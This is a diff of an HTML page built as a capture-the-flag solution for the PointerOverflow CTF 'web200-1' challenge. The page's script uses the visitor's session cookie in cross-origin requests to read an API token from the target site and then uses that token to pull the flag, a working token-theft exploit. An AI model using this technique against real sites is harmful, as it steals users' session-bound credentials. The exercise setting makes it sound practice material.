@@ -2,70 +2,80 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>PO CTF Flag Fetcher</title>
+  <title>PointerOverflow CTF - Exfiltrate Token</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
-    body { font-family: system-ui; margin: 2rem; }
-    button { margin: 0.5rem; }
-    pre { background:#eee; padding:1rem; }
+    body { font-family: system-ui, sans-serif; margin: 2rem; }
+    h1 { color: #2a7ae2; }
+    button { font-size: 1rem; padding: 0.5rem 1rem; margin: 0.5rem 0; }
+    pre { background: #f4f4f4; padding: 1rem; overflow-x: auto; }
   </style>
 </head>
 <body>
-  <h1>PointerOverflow CTF</h1>
-  <button id="loginBtn">Login</button>
-  <button id="tokenBtn" disabled>Get Token</button>
-  <button id="flagBtn" disabled>Get Flag</button>
+  <h1>PointerOverflow CTF - Token Exfiltration</h1>
+
+  <button id="fetchTokenBtn">Fetch Token</button>
+  <button id="fetchFlagBtn" disabled>Fetch Flag</button>
+
+  <p>Status: <span id="status">Idle</span></p>
+
   <pre id="output"></pre>
 
-<script>
-const loginBtn = document.getElementById('loginBtn');
-const tokenBtn = document.getElementById('tokenBtn');
-const flagBtn = document.getElementById('flagBtn');
-const output = document.getElementById('output');
+  <script>
+    const statusEl = document.getElementById('status');
+    const outputEl = document.getElementById('output');
+    const fetchTokenBtn = document.getElementById('fetchTokenBtn');
+    const fetchFlagBtn = document.getElementById('fetchFlagBtn');
 
-let apiToken = null;
+    let apiToken = '';
 
-const log = msg => output.textContent += msg + '\n';
+    const log = (msg) => {
+      console.log(msg);
+      statusEl.textContent = msg;
+    };
 
-loginBtn.onclick = async () => {
-  log('Logging in...');
-  const res = await fetch('https://web200-1.pointeroverflowctf.com/login', {
-    method: 'POST',
-    credentials: 'include'
-  });
-  const data = await res.json();
-  log(`Login: ${res.status} ${JSON.stringify(data)}`);
-  if(data.ok) {
-    log('Session cookie set. You can now fetch token.');
-    tokenBtn.disabled = false;
-  }
-};
+    fetchTokenBtn.onclick = async () => {
+      log("Fetching token from target site...");
+      try {
+        const res = await fetch('https://web200-1.pointeroverflowctf.com/api/token', {
+          credentials: 'include' // important to include the user's session cookie
+        });
 
-tokenBtn.onclick = async () => {
-  log('Fetching token...');
-  const res = await fetch('https://web200-1.pointeroverflowctf.com/api/token', {
-    credentials: 'include'
-  });
-  const data = await res.json();
-  apiToken = data.apiToken;
-  log(`Token: ${apiToken}`);
-  flagBtn.disabled = false;
-};
+        if (!res.ok) throw new Error("Token request failed");
 
-flagBtn.onclick = async () => {
-  if(!apiToken) { log('No token!'); return; }
-  log('Fetching flag...');
-  const res = await fetch('https://web200-1.pointeroverflowctf.com/api/flag', {
-    method: 'GET',
-    headers: { 'X-Flag-Token': apiToken },
-    credentials: 'include'
-  });
-  if(res.ok) {
-    const text = await res.text();
-    log('Flag: ' + text);
-  } else {
-    log(`Flag fetch failed: ${res.status}`);
-  }
-};
-</script>
+        const data = await res.json();
+        apiToken = data.apiToken;
+        log("Token fetched! You can now fetch the flag.");
+        outputEl.textContent = `Token: ${apiToken}`;
+        fetchFlagBtn.disabled = false;
+
+      } catch (err) {
+        log("Failed to fetch token.");
+        outputEl.textContent = err;
+      }
+    };
+
+    fetchFlagBtn.onclick = async () => {
+      if (!apiToken) return;
+
+      log("Fetching flag with X-Flag-Token...");
+      try {
+        const res = await fetch('https://web200-1.pointeroverflowctf.com/api/flag', {
+          headers: {
+            'X-Flag-Token': apiToken
+          },
+          credentials: 'include'
+        });
+
+        const text = await res.text();
+        log("Flag fetched!");
+        outputEl.textContent = `Flag response:\n${text}`;
+
+      } catch (err) {
+        log("Failed to fetch flag.");
+        outputEl.textContent = err;
+      }
+    };
+  </script>
 </body>
 </html>
